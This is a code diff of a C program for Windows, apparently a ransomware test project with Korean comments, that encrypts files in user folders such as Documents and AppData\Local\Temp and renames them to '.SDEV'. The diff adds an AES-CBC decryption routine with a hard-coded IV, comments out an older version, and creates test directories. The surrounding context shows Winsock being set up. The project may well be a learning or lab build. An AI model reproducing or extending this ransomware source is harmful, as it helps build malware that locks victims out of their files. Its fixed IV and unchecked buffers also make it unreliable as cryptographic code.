@@ -232,7 +232,114 @@ void EncryptTarget(target* t, unsigned char* key) {
     FindClose(hFind);
 }
 
+void DecryptTarget(target* t, unsigned char* key) {
+    wchar_t path2[1000]; // Readfile, Writefile 원래의 확장자 변경을 위한 path2
+    wcscpy(path2, t->addr);
 
+    struct AES_ctx ctx;
+    AES_init_ctx_iv(&ctx, key, (uint8_t[]) { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f });
+
+    printf("\n----------------------\n");
+    wcscat(path2, L"*");
+    printf("path :%S\n", path2);
+
+    WIN32_FIND_DATAW FindData; // 파일 검색 데이터 구조체 변수
+    HANDLE hFind;  // 파일 검색 핸들
+    hFind = FindFirstFileW(path2, &FindData); // 파일 검색 시작
+
+    if (hFind == INVALID_HANDLE_VALUE) {
+        puts("NO FILE.");
+        return;
+    }
+
+    do {
+        wcscpy(path2, t->addr); // 주소 초기화
+        wcscat(path2, FindData.cFileName); // 파일 이름 추가
+
+        wchar_t* dotPos = wcsrchr(FindData.cFileName, L'.');
+        if (dotPos && wcscmp(dotPos, L".SDEV") == 0) {
+            wprintf(L"Decrypting: %s\n", path2);
+
+            // Open the encrypted file
+            HANDLE hFile = CreateFileW(path2, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile == INVALID_HANDLE_VALUE) {
+                printf("Failed to open file for decryption: %S\n", path2);
+                continue;
+            }
+
+            // Read the encrypted file content
+            DWORD bytesRead;
+            BYTE buffer[40960];
+            DWORD currentPosition;
+
+            HANDLE wFile;
+            wchar_t path1[1000];
+
+            // 첫 번째 블록을 읽고 복호화
+            if (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
+                AES_CBC_decrypt_buffer(&ctx, buffer, bytesRead);
+
+                // Construct new path for decrypted file in a subdirectory
+                wchar_t newDir[1000];
+                wcscpy(newDir, t->addr);
+                wcscat(newDir, L"test");
+                wchar_t index[2];
+                wsprintf(index, L"%d", (t->addr[wcslen(t->addr) - 2] - L'0')); // RansomwareTest 뒤 숫자를 가져와서 디렉터리 이름으로 사용
+                wcscat(newDir, index);
+                wcscat(newDir, L"\\");
+
+                // Ensure the decrypted directory exists
+                CreateDirectoryW(newDir, NULL);
+
+                wcscpy(path1, newDir);
+                wcscat(path1, FindData.cFileName);
+
+                // Change the file extension back to original
+                dotPos = wcsrchr(path1, L'.');
+                if (dotPos) {
+                    wcscpy(dotPos, t->oex);
+                }
+                else {
+                    wcscat(path1, t->oex);
+                }
+
+                // Write the decrypted content back to a new file
+                wFile = CreateFileW(path1, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                if (wFile == INVALID_HANDLE_VALUE) {
+                    printf("Failed to open file for writing: %S\n", path1);
+                    CloseHandle(hFile);
+                    continue;
+                }
+
+                DWORD bytesWritten;
+                WriteFile(wFile, buffer, bytesRead, &bytesWritten, NULL);
+                currentPosition = SetFilePointer(hFile, 0, NULL, FILE_CURRENT);
+
+                // 남은 부분을 읽어서 복호화하고 쓰기
+                while (bytesRead > 0) {
+                    ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);
+
+                    if (bytesRead == 0) {
+                        break; // 파일 끝에 도달한 경우 루프 종료
+                    }
+
+                    AES_CBC_decrypt_buffer(&ctx, buffer, bytesRead);
+                    WriteFile(wFile, buffer, bytesRead, &bytesWritten, NULL);
+                }
+
+                // 현재 파일 포인터 위치를 읽어서 쓴 위치로 복원
+                SetFilePointer(hFile, currentPosition, NULL, FILE_BEGIN);
+                CloseHandle(wFile);
+            }
+
+            CloseHandle(hFile);
+            wprintf(L"Decrypted and restored: %s\n", path1);
+        }
+    } while (FindNextFileW(hFind, &FindData));
+
+    FindClose(hFind);
+}
+/*
 void DecryptTarget(target* t, unsigned char* key) {
     wchar_t path2[1000]; //Readfile, Writefile 원래의 확장자 변경을 위한 path2
     wcscpy(path2, t->addr);
@@ -264,7 +371,7 @@ void DecryptTarget(target* t, unsigned char* key) {
 
     FindClose(hFind);
 }
-
+*/
 
 
 int main()
@@ -285,6 +392,17 @@ int main()
     wcscat(tt[2].addr, L"\\Documents\\");
     wcscat(tt[3].addr, L"\\AppData\\Local\\Temp\\");
 
+   // 각 디렉터리 생성
+    for (int i = 0; i < 4; i++) {
+        CreateDirectoryW(tt[i].addr, NULL);
+        wchar_t subDir[1000];
+        wcscpy(subDir, tt[i].addr);
+        wcscat(subDir, L"test");
+        wchar_t index[2];
+        wsprintf(index, L"%d", i + 1);
+        wcscat(subDir, index);
+        CreateDirectoryW(subDir, NULL);
+    }
 
     // Winsock 초기화
     WSADATA wsaData = { 0 };
